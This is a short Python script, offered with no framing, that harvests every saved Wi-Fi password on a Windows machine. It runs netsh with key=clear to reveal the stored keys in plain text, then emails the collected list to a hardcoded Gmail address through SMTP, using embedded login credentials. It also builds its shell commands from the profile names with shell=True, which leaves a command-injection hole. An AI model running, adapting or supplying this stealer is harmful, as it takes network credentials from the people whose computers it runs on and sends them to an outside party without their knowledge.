import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def get_networks_name():
    command = "netsh wlan show profile"
    networks = (subprocess.check_output(command, shell=True)).decode()
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
    return network_names_list


def get_password(network_names_list):
    result = ""
    for network_name in network_names_list:
        try:
            command = "netsh wlan show profile " + network_name + " key=clear"
            current_result = (subprocess.check_output(command, shell=True)).decode()
            current_result = re.findall("(?:Content\s*:\s)(.*)", current_result)
            if current_result:
                result += network_name + current_result[0] + "\n" + "------------------------------------------" + "\n"
            else:
                result += network_name + "NO PASS" + "\n" + "------------------------------------------" + "\n"
            
        except:
            result += network_name + "ERROR" + "\n" + "------------------------------------------" + "\n"
    return result


if __name__ == '__main__':
    result = get_password(get_networks_name())
    send_mail("smartsecureuniverse@gmail.com", "Sc0 rpi 0n", result)
